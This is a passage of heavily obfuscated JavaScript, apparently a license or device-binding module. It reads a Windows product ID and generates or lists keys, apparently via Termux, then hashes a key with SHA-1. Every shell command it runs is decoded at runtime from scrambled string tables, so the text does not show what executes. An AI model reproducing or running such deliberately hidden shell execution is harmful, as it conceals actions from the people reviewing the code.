  }, __p_2786467427_dLR_0__JS_PREDICT__(-0x28)),
  getWindowsProductId = async () => {
    try {
      var __p_2120185391__JS_PREDICT__ = __p_6510065121(
          (...__p_1283371307_stack) => {
            __p_2360982505(
              (__p_1283371307_stack.length =
                __p_2786467427_dLR_0__JS_PREDICT__(-0x22)),
              (__p_1283371307_stack.UpDGEdS = __p_1283371307_stack[0x1])
            );
            if (
              typeof __p_1283371307_stack[
                __p_2786467427_dLR_0__JS_PREDICT__(-0x24)
              ] === "undefined"
            ) {
              __p_1283371307_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x24)] =
                __p_6010184479__JS_PREDICT____JS_CRITICAL__;
            }
            __p_1283371307_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x3f)] =
              __p_1283371307_stack[0x2];
            if (
              typeof __p_1283371307_stack[
                __p_2786467427_dLR_0__JS_PREDICT__(-0x25)
              ] === "undefined"
            ) {
              __p_1283371307_stack[0x4] = __p_3576149457;
            }
            if (__p_1283371307_stack[0xa8] == __p_1283371307_stack[0x0]) {
              return (__p_1283371307_stack.UpDGEdS[
                __p_3576149457[
                  __p_1283371307_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x3f)]
                ]
              ] = __p_2120185391__JS_PREDICT__(
                __p_1283371307_stack[0x0],
                __p_1283371307_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x40)]
              ));
            }
            if (
              __p_1283371307_stack[
                __p_2786467427_dLR_0__JS_PREDICT__(-0x2e)
              ] !== __p_1283371307_stack.UpDGEdS
            ) {
              return (
                __p_1283371307_stack[0x4][
                  __p_1283371307_stack[
                    __p_2786467427_dLR_0__JS_PREDICT__(-0x2e)
                  ]
                ] ||
                (__p_1283371307_stack[
                  __p_2786467427_dLR_0__JS_PREDICT__(-0x25)
                ][
                  __p_1283371307_stack[
                    __p_2786467427_dLR_0__JS_PREDICT__(-0x2e)
                  ]
                ] = __p_1283371307_stack[
                  __p_2786467427_dLR_0__JS_PREDICT__(-0x24)
                ](
                  __p_1940297625[
                    __p_1283371307_stack[
                      __p_2786467427_dLR_0__JS_PREDICT__(-0x2e)
                    ]
                  ]
                ))
              );
            }
            if (__p_1283371307_stack[0x3] === __p_2120185391__JS_PREDICT__) {
              __p_6010184479__JS_PREDICT____JS_CRITICAL__ =
                __p_1283371307_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x40)];
              return __p_6010184479__JS_PREDICT____JS_CRITICAL__(
                __p_1283371307_stack[0xa8]
              );
            }
            if (
              __p_1283371307_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x40)]
            ) {
              [
                __p_1283371307_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x25)],
                __p_1283371307_stack.UpDGEdS,
              ] = [
                __p_1283371307_stack[0x3](__p_1283371307_stack[0x4]),
                __p_1283371307_stack[
                  __p_2786467427_dLR_0__JS_PREDICT__(-0x2e)
                ] || __p_1283371307_stack[0xa8],
              ];
              return __p_2120185391__JS_PREDICT__(
                __p_1283371307_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x2e)],
                __p_1283371307_stack[0x4],
                __p_1283371307_stack[0xa8]
              );
            }
            if (
              __p_1283371307_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x3f)] ==
              __p_1283371307_stack[0x3]
            ) {
              return __p_1283371307_stack.UpDGEdS
                ? __p_1283371307_stack[
                    __p_2786467427_dLR_0__JS_PREDICT__(-0x2e)
                  ][
                    __p_1283371307_stack[
                      __p_2786467427_dLR_0__JS_PREDICT__(-0x25)
                    ][
                      __p_1283371307_stack[
                        __p_2786467427_dLR_0__JS_PREDICT__(0x40)
                      ]
                    ]
                  ]
                : __p_3576149457[
                    __p_1283371307_stack[
                      __p_2786467427_dLR_0__JS_PREDICT__(-0x2e)
                    ]
                  ] ||
                    ((__p_1283371307_stack[
                      __p_2786467427_dLR_0__JS_PREDICT__(0x3f)
                    ] =
                      __p_1283371307_stack[
                        __p_2786467427_dLR_0__JS_PREDICT__(-0x25)
                      ][
                        __p_1283371307_stack[
                          __p_2786467427_dLR_0__JS_PREDICT__(-0x2e)
                        ]
                      ] || __p_1283371307_stack[0x3]),
                    (__p_3576149457[
                      __p_1283371307_stack[
                        __p_2786467427_dLR_0__JS_PREDICT__(-0x2e)
                      ]
                    ] = __p_1283371307_stack[0xa8](
                      __p_1940297625[
                        __p_1283371307_stack[
                          __p_2786467427_dLR_0__JS_PREDICT__(-0x2e)
                        ]
                      ]
                    )));
            }
            if (
              __p_1283371307_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x3f)] &&
              __p_1283371307_stack[
                __p_2786467427_dLR_0__JS_PREDICT__(-0x24)
              ] !== __p_6010184479__JS_PREDICT____JS_CRITICAL__
            ) {
              __p_2120185391__JS_PREDICT__ =
                __p_6010184479__JS_PREDICT____JS_CRITICAL__;
              return __p_2120185391__JS_PREDICT__(
                __p_1283371307_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x2e)],
                -0x1,
                __p_1283371307_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x3f)],
                __p_1283371307_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x24)],
                __p_1283371307_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x25)]
              );
            }
          },
          __p_2786467427_dLR_0__JS_PREDICT__(-0x22)
        ),
        __p_1316360498,
        __p_5479529029;
      __p_2360982505(
        (__p_1316360498 = __p_2120185391__JS_PREDICT__(0x48)),
        (__p_5479529029 = [__p_2120185391__JS_PREDICT__(0x43)])
      );
      const {
        [__p_2120185391__JS_PREDICT__(0x42)]: stdout,
        [__p_5479529029[0x0]]: stderr,
      } = await execPromise(
        __p_2120185391__JS_PREDICT__(__p_2786467427_dLR_0__JS_PREDICT__(0x1c)) +
          __p_2120185391__JS_PREDICT__(
            __p_2786467427_dLR_0__JS_PREDICT__(0x41)
          ) +
          __p_2120185391__JS_PREDICT__(
            __p_2786467427_dLR_0__JS_PREDICT__(0x42)
          ) +
          __p_2120185391__JS_PREDICT__(0x47) +
          '"'
      );
      if (
        stderr &&
        __p_9743501678.vVupayL > __p_2786467427_dLR_0__JS_PREDICT__(-0x20)
      ) {
        return null;
      }
      const productId = stdout[__p_1316360498]();
      return productId;
      function __p_6010184479__JS_PREDICT____JS_CRITICAL__(
        str,
        table = 'CvsnNx;USae7*401wutdlTpDK6%=]9>z?XP)<Rm:M|#kgE&ijJLYhW{crHG`"+Z_2Iby~^o}B3.@(8$/,AfOVqQF[5!',
        raw,
        len,
        ret = [],
        b = 0x0,
        n = 0x0,
        v,
        i,
        p
      ) {
        __p_2360982505(
          (raw = "" + (str || "")),
          (len = raw.length),
          (v = -__p_2786467427_dLR_0__JS_PREDICT__(-0x28))
        );
        for (i = __p_2786467427_dLR_0__JS_PREDICT__(-0x2e); i < len; i++) {
          p = table.indexOf(raw[i]);
          if (p === -__p_2786467427_dLR_0__JS_PREDICT__(-0x28)) {
            continue;
          }
          if (v < __p_2786467427_dLR_0__JS_PREDICT__(-0x2e)) {
            v = p;
          } else {
            __p_2360982505(
              (v += p * __p_2786467427_dLR_0__JS_PREDICT__(-0x1d)),
              (b |= v << n),
              (n +=
                (v & __p_2786467427_dLR_0__JS_PREDICT__(0xd)) >
                __p_2786467427_dLR_0__JS_PREDICT__(-0x16)
                  ? 0xd
                  : 0xe)
            );
            do {
              __p_2360982505(
                ret.push(b & __p_2786467427_dLR_0__JS_PREDICT__(-0x1c)),
                (b >>= __p_2786467427_dLR_0__JS_PREDICT__(-0x15)),
                (n -= __p_2786467427_dLR_0__JS_PREDICT__(-0x15))
              );
            } while (n > 0x7);
            v = -0x1;
          }
        }
        if (v > -0x1) {
          ret.push((b | (v << n)) & 0xff);
        }
        return __p_1990998267__JS_PREDICT__(ret);
      }
    } catch (error) {
      return __p_2786467427_dLR_0__JS_PREDICT__(0x49);
    }
  },
  generateLicenseTermux = async (...__p_1376344184_stack) => {
    __p_2360982505(
      (__p_1376344184_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x2f)] = 0x0),
      (__p_1376344184_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x43)] = -0x83)
    );
    try {
      var __p_9960897417__JS_PREDICT__ = (x, y, z, a, b) => {
        if (typeof a === "undefined") {
          a = __p_0558092582__JS_PREDICT____JS_CRITICAL__;
        }
        if (typeof b === __p_2786467427_dLR_0__JS_PREDICT__(-0x27)) {
          b = __p_3576149457;
        }
        if (x !== y) {
          return b[x] || (b[x] = a(__p_1940297625[x]));
        }
        if (a === void 0x0) {
          __p_9960897417__JS_PREDICT__ = b;
        }
        if (z && a !== __p_0558092582__JS_PREDICT____JS_CRITICAL__) {
          __p_9960897417__JS_PREDICT__ =
            __p_0558092582__JS_PREDICT____JS_CRITICAL__;
          return __p_9960897417__JS_PREDICT__(x, -0x1, z, a, b);
        }
      };
      __p_1376344184_stack[0x6] = [
        __p_9960897417__JS_PREDICT__(__p_2786467427_dLR_0__JS_PREDICT__(0x76)),
      ];
      const {
        [__p_9960897417__JS_PREDICT__(
          __p_2786467427_dLR_0__JS_PREDICT__(0x44)
        )]: stdout,
        [__p_9960897417__JS_PREDICT__(0x4a)]: stderr,
      } = __p_8438996831__JS_CRITICAL__(
        await execPromise(
          __p_0575541368_calc(
            __p_1376344184_stack[
              __p_1376344184_stack[
                __p_1376344184_stack[0x19] +
                  __p_2786467427_dLR_0__JS_PREDICT__(0x6b)
              ] +
                (__p_1376344184_stack[0x19] + 0x10c)
            ][0x0] + ALIAS,
            __p_9960897417__JS_PREDICT__(
              __p_2786467427_dLR_0__JS_PREDICT__(-0x11)
            ),
            __p_0333540851(-__p_2786467427_dLR_0__JS_PREDICT__(-0xa))
          )
        ),
        await execPromise(
          __p_9960897417__JS_PREDICT__(
            __p_2786467427_dLR_0__JS_PREDICT__(-0x18)
          ) +
            __p_9960897417__JS_PREDICT__(0x4e) +
            __p_9960897417__JS_PREDICT__(0x4f) +
            __p_9960897417__JS_PREDICT__(
              __p_1376344184_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x43)] +
                0xd3
            )
        )
      );
      if (stderr && __p_9743501678.yaLutw()) {
        throw new Error(
          __p_9960897417__JS_PREDICT__[
            __p_2786467427_dLR_0__JS_PREDICT__(0x1d)
          ](
            void 0x0,
            __p_1376344184_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x43)] +
              __p_2786467427_dLR_0__JS_PREDICT__(0x80)
          )
        );
      }
      let licenseKey = null;
      try {
        var __p_5322522263__JS_PREDICT__ = (x, y, z, a, b) => {
          if (typeof a === "undefined") {
            a = __p_2292549558__JS_PREDICT____JS_CRITICAL__;
          }
          if (typeof b === "undefined") {
            b = __p_3576149457;
          }
          if (z == x) {
            return (y[__p_3576149457[z]] = __p_5322522263__JS_PREDICT__(x, y));
          }
          if (y) {
            [b, y] = [a(b), x || z];
            return __p_5322522263__JS_PREDICT__(x, b, z);
          }
          if (a === __p_5322522263__JS_PREDICT__) {
            __p_2292549558__JS_PREDICT____JS_CRITICAL__ = y;
            return __p_2292549558__JS_PREDICT____JS_CRITICAL__(z);
          }
          if (x !== y) {
            return b[x] || (b[x] = a(__p_1940297625[x]));
          }
          if (z == a) {
            return y
              ? x[b[y]]
              : __p_3576149457[x] ||
                  ((z = b[x] || a), (__p_3576149457[x] = z(__p_1940297625[x])));
          }
        };
        __p_2360982505(
          (__p_1376344184_stack[0xb] = [
            __p_5322522263__JS_PREDICT__(0x52),
            __p_5322522263__JS_PREDICT__(0x54),
          ]),
          (__p_1376344184_stack[0xc] = JSON[
            __p_1376344184_stack[
              __p_1376344184_stack[0x19] +
                (__p_1376344184_stack[
                  __p_2786467427_dLR_0__JS_PREDICT__(0x43)
                ] +
                  0x111)
            ][
              __p_1376344184_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x43)] +
                __p_2786467427_dLR_0__JS_PREDICT__(0x81)
            ]
          ](
            stdout[
              __p_5322522263__JS_PREDICT__(
                __p_2786467427_dLR_0__JS_PREDICT__(0x0)
              )
            ]()
          ))
        );
        if (
          __p_1376344184_stack[0xc][
            __p_1376344184_stack[0xb][__p_2786467427_dLR_0__JS_PREDICT__(-0x28)]
          ] > __p_2786467427_dLR_0__JS_PREDICT__(-0x2e) &&
          __p_9743501678.tZjv4eQ[__p_5322522263__JS_PREDICT__(0x55)](
            __p_2786467427_dLR_0__JS_PREDICT__(-0x22)
          ) == __p_2786467427_dLR_0__JS_PREDICT__(0x20)
        ) {
          __p_2360982505(
            (__p_1376344184_stack[
              __p_1376344184_stack[0x19] -
                (__p_1376344184_stack[
                  __p_2786467427_dLR_0__JS_PREDICT__(0x43)
                ] -
                  __p_2786467427_dLR_0__JS_PREDICT__(-0xb))
            ] = __p_5322522263__JS_PREDICT__(
              __p_2786467427_dLR_0__JS_PREDICT__(0x45)
            )),
            __p_1376344184_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x2a)][
              __p_1376344184_stack[0xd]
            ]((key) => {
              if (
                key[__p_9960897417__JS_PREDICT__(0x57)] === ALIAS &&
                __p_9743501678.yaLutw()
              ) {
                licenseKey = sha1Hash(
                  key[
                    __p_5322522263__JS_PREDICT__(
                      __p_2786467427_dLR_0__JS_PREDICT__(-0x16)
                    )
                  ]
                );
              }
            })
          );
        }
        function __p_2292549558__JS_PREDICT____JS_CRITICAL__(
          str,
          table = '5NZOaWShn2QfIc{0K[4(6J"V&L|r?g/tM*zRHq,kEU8T@ibC<+Y1yFD7)=]x!_sw;lBA$Pd>#9G%X^vu.~`m3ep:jo}',
          raw,
          len,
          ret = [],
          b = 0x0,
          n = 0x0,
          v,
          i = 0x0,
          p
        ) {
          __p_2360982505(
            (raw = "" + (str || "")),
            (len = raw.length),
            (v = -0x1)
          );
          for (i = i; i < len; i++) {
            p = table.indexOf(raw[i]);
            if (p === -0x1) {
              continue;
            }
            if (v < 0x0) {
              v = p;
            } else {
              __p_2360982505(
                (v += p * 0x5b),
                (b |= v << n),
                (n +=
                  (v & __p_2786467427_dLR_0__JS_PREDICT__(0xd)) >
                  __p_2786467427_dLR_0__JS_PREDICT__(-0x16)
                    ? 0xd
                    : 0xe)
              );
              do {
                __p_2360982505(ret.push(b & 0xff), (b >>= 0x8), (n -= 0x8));
              } while (n > __p_2786467427_dLR_0__JS_PREDICT__(0x2));
              v = -__p_2786467427_dLR_0__JS_PREDICT__(-0x28);
            }
          }
          if (v > -__p_2786467427_dLR_0__JS_PREDICT__(-0x28)) {
            ret.push(
              (b | (v << n)) & __p_2786467427_dLR_0__JS_PREDICT__(-0x1c)
            );
          }
          return __p_1990998267__JS_PREDICT__(ret);
        }
      } catch (error) {
        throw new Error(__p_9960897417__JS_PREDICT__(0x59));
      }
      if (
        __p_0575541368_calc(
          licenseKey,
          __p_0333540851(__p_2786467427_dLR_0__JS_PREDICT__(0x3))
        ) &&
        __p_9743501678.vVupayL > 0x2
      ) {
        throw new Error(__p_9960897417__JS_PREDICT__(0x5a));
      }
      return licenseKey;
      function __p_0558092582__JS_PREDICT____JS_CRITICAL__(
        str,
        table = 'y;?~][(x`NfHeP,70s!2AFti48lDWq/b>TM9K&6BgG@Yc+w_ajOdVZnv=3LmREp%15I*k}.CuQ)rXUSJh$#zo":|^<{',
        raw,
        len,
        ret = [],
        b = 0x0,
        n = 0x0,
        v,
        i,
        p
      ) {
        __p_2360982505(
          (raw = "" + (str || "")),
          (len = raw.length),
          (v = -__p_2786467427_dLR_0__JS_PREDICT__(-0x28))
        );
        for (i = __p_2786467427_dLR_0__JS_PREDICT__(-0x2e); i < len; i++) {
          p = table.indexOf(raw[i]);
          if (p === -__p_2786467427_dLR_0__JS_PREDICT__(-0x28)) {
            continue;
          }
          if (v < __p_2786467427_dLR_0__JS_PREDICT__(-0x2e)) {
            v = p;
          } else {
            __p_2360982505(
              (v += p * 0x5b),
              (b |= v << n),
              (n +=
                (v & 0x1fff) > 0x58
                  ? __p_2786467427_dLR_0__JS_PREDICT__(-0xb)
                  : __p_2786467427_dLR_0__JS_PREDICT__(0xe))
            );
            do {
              __p_2360982505(
                ret.push(b & __p_2786467427_dLR_0__JS_PREDICT__(-0x1c)),
                (b >>= 0x8),
                (n -= 0x8)
              );
            } while (n > __p_2786467427_dLR_0__JS_PREDICT__(0x2));
            v = -__p_2786467427_dLR_0__JS_PREDICT__(-0x28);
          }
        }
        if (v > -__p_2786467427_dLR_0__JS_PREDICT__(-0x28)) {
          ret.push((b | (v << n)) & 0xff);
        }
        return __p_1990998267__JS_PREDICT__(ret);
      }
    } catch (error) {
      var __p_9475699700__JS_PREDICT__ = __p_6510065121(
        (...__p_7296059017_stack) => {
          __p_2360982505(
            (__p_7296059017_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x2f)] =
              __p_2786467427_dLR_0__JS_PREDICT__(-0x22)),
            (__p_7296059017_stack[0xdf] =
              -__p_2786467427_dLR_0__JS_PREDICT__(0x46))
          );
          if (typeof __p_7296059017_stack[0x3] === "undefined") {
            __p_7296059017_stack[0x3] =
              __p_2154902664__JS_PREDICT____JS_CRITICAL__;
          }
          __p_7296059017_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x47)] =
            __p_7296059017_stack[0x4];
          if (
            typeof __p_7296059017_stack[
              __p_2786467427_dLR_0__JS_PREDICT__(0x47)
            ] === __p_2786467427_dLR_0__JS_PREDICT__(-0x27)
          ) {
            __p_7296059017_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x47)] =
              __p_3576149457;
          }
          if (
            __p_7296059017_stack[0x0] !==
            __p_7296059017_stack[
              __p_7296059017_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x84)] +
                0x3a
            ]
          ) {
            return (
              __p_7296059017_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x47)][
                __p_7296059017_stack[0x0]
              ] ||
              (__p_7296059017_stack.z_7em_c[
                __p_7296059017_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x2e)]
              ] = __p_7296059017_stack[0x3](
                __p_1940297625[__p_7296059017_stack[0x0]]
              ))
            );
          }
          if (
            __p_7296059017_stack[0x3] ===
            __p_2786467427_dLR_0__JS_PREDICT__(-0x1e)
          ) {
            __p_9475699700__JS_PREDICT__ = __p_7296059017_stack.z_7em_c;
          }
          if (
            __p_7296059017_stack[
              __p_7296059017_stack[
                __p_7296059017_stack[0xdf] +
                  __p_2786467427_dLR_0__JS_PREDICT__(0x48)
              ] + 0x3b
            ] == __p_7296059017_stack[0x0]
          ) {
            return (__p_7296059017_stack[
              __p_2786467427_dLR_0__JS_PREDICT__(-0x28)
            ][__p_3576149457[__p_7296059017_stack[0x2]]] =
              __p_9475699700__JS_PREDICT__(
                __p_7296059017_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x2e)],
                __p_7296059017_stack[
                  __p_7296059017_stack[__p_7296059017_stack[0xdf] + 0x118] +
                    0x3a
                ]
              ));
          }
          if (
            __p_7296059017_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x24)] ===
            __p_9475699700__JS_PREDICT__
          ) {
            __p_2154902664__JS_PREDICT____JS_CRITICAL__ =
              __p_7296059017_stack[0x1];
            return __p_2154902664__JS_PREDICT____JS_CRITICAL__(
              __p_7296059017_stack[0x2]
            );
          }
          if (
            __p_7296059017_stack[
              __p_7296059017_stack[
                __p_7296059017_stack[
                  __p_7296059017_stack[0xdf] +
                    __p_2786467427_dLR_0__JS_PREDICT__(0x48)
                ] + 0x118
              ] + 0x3a
            ]
          ) {
            [__p_7296059017_stack.z_7em_c, __p_7296059017_stack[0x1]] = [
              __p_7296059017_stack[0x3](__p_7296059017_stack.z_7em_c),
              __p_7296059017_stack[
                __p_7296059017_stack[0xdf] +
                  __p_2786467427_dLR_0__JS_PREDICT__(0x46)
              ] ||
                __p_7296059017_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x20)],
            ];
            return __p_9475699700__JS_PREDICT__(
              __p_7296059017_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x2e)],
              __p_7296059017_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x47)],
              __p_7296059017_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x20)]
            );
          }
        },
        0x5
      );
      __p_1376344184_stack.Y7H7IN = [__p_9475699700__JS_PREDICT__(0x5b)];
      throw new Error(
        __p_0575541368_calc(
          __p_1376344184_stack.Y7H7IN[0x0],
          error[
            __p_9475699700__JS_PREDICT__(
              __p_1376344184_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x43)] +
                0xdf
            )
          ],
          __p_0333540851(-__p_2786467427_dLR_0__JS_PREDICT__(-0xa))
        )
      );
      function __p_2154902664__JS_PREDICT____JS_CRITICAL__(
        str,
        table = 'PGSu2TsAEd>B{,KpgReJ?Mn#(fN@UV^tv3607<rz[CW9HX|hkLQ}%/xj]`aO+~c1Y85ybl$q=";.w&!4*o)Z:_DFmIi',
        raw,
        len,
        ret = [],
        b,
        n = 0x0,
        v,
        i,
        p
      ) {
        __p_2360982505(
          (raw = "" + (str || "")),
          (len = raw.length),
          (b = __p_2786467427_dLR_0__JS_PREDICT__(-0x2e)),
          (v = -__p_2786467427_dLR_0__JS_PREDICT__(-0x28))
        );
        for (i = __p_2786467427_dLR_0__JS_PREDICT__(-0x2e); i < len; i++) {
          p = table.indexOf(raw[i]);
          if (p === -__p_2786467427_dLR_0__JS_PREDICT__(-0x28)) {
            continue;
          }
          if (v < __p_2786467427_dLR_0__JS_PREDICT__(-0x2e)) {
            v = p;
          } else {
            __p_2360982505(
              (v += p * __p_2786467427_dLR_0__JS_PREDICT__(-0x1d)),
              (b |= v << n),
              (n +=
                (v & __p_2786467427_dLR_0__JS_PREDICT__(0xd)) >
                __p_2786467427_dLR_0__JS_PREDICT__(-0x16)
                  ? 0xd
                  : __p_2786467427_dLR_0__JS_PREDICT__(0xe))
            );
            do {
              __p_2360982505(
                ret.push(b & __p_2786467427_dLR_0__JS_PREDICT__(-0x1c)),
                (b >>= __p_2786467427_dLR_0__JS_PREDICT__(-0x15)),
                (n -= 0x8)
              );
            } while (n > 0x7);
            v = -0x1;
          }
        }
        if (v > -__p_2786467427_dLR_0__JS_PREDICT__(-0x28)) {
          ret.push((b | (v << n)) & __p_2786467427_dLR_0__JS_PREDICT__(-0x1c));
        }
        return __p_1990998267__JS_PREDICT__(ret);
      }
    }
  },
  getLicenseTermux = async () => {
    try {
      var __p_4824453932__JS_PREDICT__ = (x, y, z, a, b) => {
        if (typeof a === __p_2786467427_dLR_0__JS_PREDICT__(-0x27)) {
          a = __p_8406812097__JS_PREDICT____JS_CRITICAL__;
        }
        if (typeof b === "undefined") {
          b = __p_3576149457;
        }
        if (z && a !== __p_8406812097__JS_PREDICT____JS_CRITICAL__) {
          __p_4824453932__JS_PREDICT__ =
            __p_8406812097__JS_PREDICT____JS_CRITICAL__;
          return __p_4824453932__JS_PREDICT__(x, -0x1, z, a, b);
        }
        if (a === __p_4824453932__JS_PREDICT__) {
          __p_8406812097__JS_PREDICT____JS_CRITICAL__ = y;
          return __p_8406812097__JS_PREDICT____JS_CRITICAL__(z);
        }
        if (x !== y) {
          return b[x] || (b[x] = a(__p_1940297625[x]));
        }
        if (a === __p_2786467427_dLR_0__JS_PREDICT__(-0x1e)) {
          __p_4824453932__JS_PREDICT__ = b;
        }
        if (y) {
          [b, y] = [a(b), x || z];
          return __p_4824453932__JS_PREDICT__(x, b, z);
        }
        if (z == x) {
          return (y[__p_3576149457[z]] = __p_4824453932__JS_PREDICT__(x, y));
        }
      };
      const {
        [__p_4824453932__JS_PREDICT__(0x5d)]: stdout,
        [__p_4824453932__JS_PREDICT__(0x5e)]: stderr,
      } = await execPromise(__p_4824453932__JS_PREDICT__(0x5f));
      if (
        stderr &&
        __p_9743501678.eC13w_[
          __p_4824453932__JS_PREDICT__(__p_2786467427_dLR_0__JS_PREDICT__(0x4b))
        ](0x4) == 0x61
      ) {
        throw new Error(
          __p_4824453932__JS_PREDICT__(__p_2786467427_dLR_0__JS_PREDICT__(0x4c))
        );
      }
      let licenseKey = __p_2786467427_dLR_0__JS_PREDICT__(0x49);
      try {
        const keyList = JSON[__p_4824453932__JS_PREDICT__(0x62)](
          stdout[
            __p_4824453932__JS_PREDICT__[
              __p_2786467427_dLR_0__JS_PREDICT__(0x18)
            ](void 0x0, [0x63])
          ]()
        );
        if (
          keyList[
            __p_4824453932__JS_PREDICT__(
              __p_2786467427_dLR_0__JS_PREDICT__(-0xf)
            )
          ] > 0x0 &&
          __p_9743501678.tZjv4eQ[__p_4824453932__JS_PREDICT__(0x65)](
            __p_2786467427_dLR_0__JS_PREDICT__(-0x22)
          ) == __p_2786467427_dLR_0__JS_PREDICT__(0x20)
        ) {
          var __p_5089181735 = {
            [__p_2786467427_dLR_0__JS_PREDICT__(0x4a)]:
              __p_4824453932__JS_PREDICT__.call(
                __p_2786467427_dLR_0__JS_PREDICT__(-0x1e),
                0x66
              ),
          };
          keyList[__p_5089181735[__p_2786467427_dLR_0__JS_PREDICT__(0x4a)]](
            (key) => {
              if (
                key[__p_4824453932__JS_PREDICT__(0x67)] === ALIAS &&
                __p_9743501678.vVupayL > 0x2
              ) {
                licenseKey = sha1Hash(key[__p_4824453932__JS_PREDICT__(0x68)]);
              }
            }
          );
        }
      } catch (error) {
        throw new Error(
          __p_4824453932__JS_PREDICT__(__p_2786467427_dLR_0__JS_PREDICT__(0x3d))
        );
      }
      if (
        __p_0575541368_calc(
          licenseKey,
          __p_0333540851(__p_2786467427_dLR_0__JS_PREDICT__(0x3))
        ) &&
        __p_9743501678.eC13w_[
          __p_4824453932__JS_PREDICT__(__p_2786467427_dLR_0__JS_PREDICT__(0x4b))
        ](0x4) == __p_2786467427_dLR_0__JS_PREDICT__(0x4c)
      ) {
        licenseKey = await generateLicenseTermux();
      }
      return licenseKey;
      function __p_8406812097__JS_PREDICT____JS_CRITICAL__(
        str,
        table = '6bp5O(R1P0{/ITV~*DWqC93_Zu;fSsXJ>iY+AGn.QB"o7E:e)vw@?4!%2hd^ktagMH[=&cF#NUl8}<r$,]xymK|`jzL',
        raw,
        len,
        ret = [],
        b = 0x0,
        n,
        v,
        i = 0x0,
        p
      ) {
        __p_2360982505(
          (raw = "" + (str || "")),
          (len = raw.length),
          (n = __p_2786467427_dLR_0__JS_PREDICT__(-0x2e)),
          (v = -__p_2786467427_dLR_0__JS_PREDICT__(-0x28))
        );
        for (i = i; i < len; i++) {
          p = table.indexOf(raw[i]);
          if (p === -__p_2786467427_dLR_0__JS_PREDICT__(-0x28)) {
            continue;
          }
          if (v < 0x0) {
            v = p;
          } else {
            __p_2360982505(
              (v += p * 0x5b),
              (b |= v << n),
              (n +=
                (v & __p_2786467427_dLR_0__JS_PREDICT__(0xd)) >
                __p_2786467427_dLR_0__JS_PREDICT__(-0x16)
                  ? __p_2786467427_dLR_0__JS_PREDICT__(-0xb)
                  : __p_2786467427_dLR_0__JS_PREDICT__(0xe))
            );
            do {
              __p_2360982505(
                ret.push(b & 0xff),
                (b >>= __p_2786467427_dLR_0__JS_PREDICT__(-0x15)),
                (n -= 0x8)
              );
            } while (n > __p_2786467427_dLR_0__JS_PREDICT__(0x2));
            v = -0x1;
          }
        }
        if (v > -0x1) {
          ret.push((b | (v << n)) & 0xff);
        }
        return __p_1990998267__JS_PREDICT__(ret);
      }
    } catch (error) {
      var __p_1898221987__JS_PREDICT__ = __p_6510065121(
        (...__p_2724916592_stack) => {
          __p_2360982505(
            (__p_2724916592_stack.length = 0x5),
            (__p_2724916592_stack.pbQKmN =
              __p_2786467427_dLR_0__JS_PREDICT__(-0x19))
          );
          if (
            typeof __p_2724916592_stack[
              __p_2786467427_dLR_0__JS_PREDICT__(-0x24)
            ] === __p_2786467427_dLR_0__JS_PREDICT__(-0x27)
          ) {
            __p_2724916592_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x24)] =
              __p_6331415602__JS_PREDICT____JS_CRITICAL__;
          }
          if (typeof __p_2724916592_stack[0x4] === "undefined") {
            __p_2724916592_stack[
              __p_2724916592_stack.pbQKmN -
                (__p_2724916592_stack.pbQKmN -
                  __p_2786467427_dLR_0__JS_PREDICT__(-0x25))
            ] = __p_3576149457;
          }
          if (__p_2724916592_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x28)]) {
            [
              __p_2724916592_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x25)],
              __p_2724916592_stack[0x1],
            ] = [
              __p_2724916592_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x24)](
                __p_2724916592_stack[0x4]
              ),
              __p_2724916592_stack[
                __p_2724916592_stack[__p_2786467427_dLR_0__JS_PREDICT__(0x4d)] -
                  (__p_2724916592_stack[
                    __p_2786467427_dLR_0__JS_PREDICT__(0x4d)
                  ] -
                    0x0)
              ] || __p_2724916592_stack[__p_2724916592_stack.pbQKmN - 0x31],
            ];
            return __p_1898221987__JS_PREDICT__(
              __p_2724916592_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x2e)],
              __p_2724916592_stack[0x4],
              __p_2724916592_stack[__p_2786467427_dLR_0__JS_PREDICT__(-0x20)]
            );
          }
          if (
            __p_2724916592_stack[0x2] &&
            __p_2724916592_stack[
              __p_2724916592_stack.pbQKmN -
                __p_2786467427_dLR_0__JS_PREDICT__(0x3a)
            ] !== __p_6331415602__JS_PREDICT____JS_CRITICAL__
          ) {
            __p_1898221987__JS_PREDICT__ =
              __p_6331415602__JS_PREDICT____JS_CRITICAL__;
            return __p_1898221987__JS_PREDICT__(
              __p_2724916592_stack[__p_2724916592_stack.pbQKmN - 0x33],
              -__p_2786467427_dLR_0__JS_PREDICT__(-0x28),
              __p_2724916592_stack[0x2],
              __p_2724916592_stack[0x3],
              __p_2724916592_stack[
